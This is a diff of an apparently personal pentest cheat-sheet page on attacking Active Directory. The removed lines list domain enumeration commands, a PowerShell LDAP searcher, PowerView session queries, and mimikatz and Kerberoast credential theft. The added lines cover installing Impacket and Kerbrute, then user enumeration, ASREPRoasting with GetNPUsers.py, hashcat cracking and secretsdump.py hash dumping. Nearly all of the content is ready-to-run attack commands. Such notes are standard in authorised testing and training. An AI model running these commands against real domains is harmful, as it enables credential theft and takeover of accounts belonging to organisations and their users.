@@ -1,59 +1,86 @@
-# Active Directory
+[../](../)
 
-### Enumeration
+# Impacket instalation
 
-```text
-net user /domain
-net user <user> /domain
-net group /domain
+## Introduction
 
-PS> Get-ADUser
-PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+So you're likely here if you've had issues with Impacket. Impacket is moderately frustrating to say the least... A lot of people have issues with it, so let's walk through the Impacket install process!
+
+## Installing Impacket
+
+First, you'll want to clone the repo with:
+
+```
+git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
 ```
 
-```text
-$dObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-$PDC = ($dObj.PdcRoleOwner).Name
-$query= "LDAP://"
-$query+= $PDC + "/"
-$dName = "DC=$($dObj.Name.Replace('.',',DC='))"
-$query+= $dName
-$query
-$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$query)
-$objDomain = New-Object System.DirectoryServices.DirectoryEntry
-$Searcher.SearchRoot = $objDomain
-$Searcher.filter = "samAccountType=805306368"
-# $Searcher.filter = "name=Peter"
-# $Searcher.filter = "objectClass=Group"
-# $Searcher.filter = "name=Domain Admins..."
-# $Searcher.filter = "serviceprincipalname=*http*"
-$Results = $Searcher.FindAll()
+This will clone Impacket to /opt/impacket/, after the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It's key that you DO NOT miss it.
 
-Foreach($Result in $Results)
-{
-    Foreach($Property in $Result.Properties)
-    {
-        $Property
-    }
-    Write-Host "---------------------------------------"
-}
+So let's install the requirements:
+
+```
+pip3 install -r /opt/impacket/requirements.txt
 ```
 
-```text
-Import-Module .\PowerView.ps1
-Get-NetLoggedOn -ComputerName <computer_name>
-Get-NetSession -ComputerName <computer_name>
+Once all the python modules are installed, we can then run the python setup install script:
+
+```
+cd /opt/impacket/ && python3 ./setup.py install
 ```
 
-```text
-mimikatz.exe
-privilege::debug
-sekurlsa::logonpasswords
-sekurlsa::tickets
-kerberos::list /export
-sudo apt install kerberoast
-python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <exported_file_to_crack>
+After that, Impacket should be correctly installed now and it should be ready to use!
+
+# Kerbrute
+
+## Instalation
+Clone the repository.
+
+```
+git clone https://github.com/ropnop/kerbrute.git /opt/kerbrute
+cd /opt/kerbrute
 ```
 
-cont. 654
+With the repository cloned, you can also use the Make file to compile for common architectures:
 
+```
+make help
+make all
+```
+
+Your new binaries will be inside `dist` directory.
+
+## Usage
+
+Enumerating users:
+
+```
+./kerbrute_linux_386 userenum --dc <RHOST> -d <domain> <userlist> 
+```
+
+# ASREPRoasting
+
+After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+
+## Exploitation
+
+Impacket has a tool called "GetNPUsers.py" (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.
+
+```
+python3 GetNPUsers.py <domain>/ -dc-ip <RHOST> -usersfile <usersfile>
+```
+
+Then crack dumped hashes.
+
+```
+hashcat -m 18200 <hashfile> <wordlist>
+```
+
+# secretsdump.py
+
+For this command to work you will need to also know user's password.
+
+```
+secretsdump.py -dc-ip <RHOST> <username>@<RHOST>
+```
+
+When successfull, this will dump domain user's NT:LM hashes.
